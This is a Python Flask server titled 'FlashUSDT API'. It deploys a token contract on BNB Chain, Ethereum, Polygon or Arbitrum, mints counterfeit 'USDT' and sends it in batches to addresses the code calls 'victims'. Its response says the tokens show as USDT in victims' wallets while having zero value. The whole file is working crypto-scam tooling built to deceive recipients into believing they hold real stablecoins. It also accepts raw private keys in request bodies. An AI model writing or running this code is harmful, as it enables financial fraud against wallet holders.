import os
import json
from functools import lru_cache
from web3 import Web3
from flask import Flask, request, jsonify

app = Flask(__name__)

NETWORKS = {
    "testnet":  {"rpc": "https://data-seed-prebsc-1-s1.bnbchain.org:8545/", "chain": 97,  "explorer": "https://testnet.bscscan.com"},
    "mainnet":  {"rpc": "https://bsc-dataseed.bnbchain.org/",                 "chain": 56,  "explorer": "https://bscscan.com"},
    "eth":      {"rpc": "https://eth.llamarpc.com",                           "chain": 1,   "explorer": "https://etherscan.io"},
    "polygon":  {"rpc": "https://polygon-rpc.com",                            "chain": 137, "explorer": "https://polygonscan.com"},
    "arbitrum": {"rpc": "https://arb1.arbitrum.io/rpc",                       "chain": 42161, "explorer": "https://arbiscan.io"},
}

CONTRACT_FILE = "deployed_contract.txt"

# Load ABI + bytecode once
with open("abi.json") as f:
    ABI = json.load(f)
with open("bytecode.txt") as f:
    BYTECODE = f.read().strip()


def get_w3(net):
    return Web3(Web3.HTTPProvider(NETWORKS[net]["rpc"]))


def load_contract_addr(net):
    path = f"deployed_contract_{net}.txt"
    if os.path.exists(path):
        return open(path).read().strip()
    return None


def save_contract_addr(net, addr):
    open(f"deployed_contract_{net}.txt", "w").write(addr)


def gas_params(w3):
    try:
        return {"maxFeePerGas": w3.to_wei("5", "gwei"),
                "maxPriorityFeePerGas": w3.to_wei("2", "gwei")}
    except Exception:
        return {"gasPrice": w3.eth.generate_gas_price() or w3.to_wei("3", "gwei")}


@app.route('/')
def index():
    try:
        with open("index.html", "r") as f:
            return f.read()
    except Exception:
        return "FlashUSDT API"


@app.route('/api/balance', methods=['POST'])
def balance():
    try:
        b = request.get_json(force=True)
        pk = b['pk']
        net = b.get('network', 'testnet')
        w3 = get_w3(net)
        acct = w3.eth.account.from_key(pk)
        bnb = w3.eth.get_balance(acct.address) / 10**18
        # Read real fake-USDT balance from deployed contract if present
        addr = load_contract_addr(net)
        usdt = 0
        if addr:
            c = w3.eth.contract(address=addr, abi=ABI)
            try:
                usdt = c.functions.balanceOf(acct.address).call() / 10**18
            except Exception:
                usdt = 0
        return jsonify({"status": "success", "bnb": round(bnb, 6), "usdt": round(usdt, 2),
                        "addr": acct.address, "contract": addr})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})


@app.route('/api/flash', methods=['POST'])
def flash():
    try:
        b = request.get_json(force=True)
        pk = b['pk']
        net = b.get('network', 'testnet')
        victims = [v.strip() for v in str(b['victim']).split(',') if v.strip()]
        amount = int(float(b.get('amount', 1000000)) * 10**18)
        w3 = get_w3(net)
        acct = w3.eth.account.from_key(pk)

        # Reuse or deploy contract
        addr = load_contract_addr(net)
        if not addr:
            nonce = w3.eth.get_transaction_count(acct.address)
            tx = {'from': acct.address, 'nonce': nonce, 'gas': 2500000,
                  **gas_params(w3), 'data': BYTECODE}
            s = acct.sign_transaction(tx)
            h = w3.eth.send_raw_transaction(s.rawTransaction)
            rcpt = w3.eth.wait_for_transaction_receipt(h)
            addr = rcpt.contractAddress
            save_contract_addr(net, addr)

        c = w3.eth.contract(address=addr, abi=ABI)
        # Mint enough
        nonce = w3.eth.get_transaction_count(acct.address)
        mt = c.functions.mint(acct.address, amount * len(victims)).build_transaction(
            {'from': acct.address, 'nonce': nonce, 'gas': 200000, **gas_params(w3)})
        s2 = acct.sign_transaction(mt)
        w3.eth.send_raw_transaction(s2.rawTransaction)

        # Single or batch transfer
        if len(victims) == 1:
            nonce = w3.eth.get_transaction_count(acct.address)
            st = c.functions.transfer(victims[0], amount).build_transaction(
                {'from': acct.address, 'nonce': nonce, 'gas': 200000, **gas_params(w3)})
            s3 = acct.sign_transaction(st)
            w3.eth.send_raw_transaction(s3.rawTransaction)
        else:
            amounts = [amount] * len(victims)
            nonce = w3.eth.get_transaction_count(acct.address)
            st = c.functions.batchTransfer(victims, amounts).build_transaction(
                {'from': acct.address, 'nonce': nonce,
                 'gas': 300000 + 60000 * len(victims), **gas_params(w3)})
            s3 = acct.sign_transaction(st)
            w3.eth.send_raw_transaction(s3.rawTransaction)

        return jsonify({
            "status": "success", "contract": addr, "victims": victims,
            "amount": amount / 10**18, "network": net,
            "explorer": NETWORKS[net]["explorer"] + "/token/" + addr,
            "note": "Fake USDT sent. Shows in victim wallet as USDT (zero value)."
        })
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
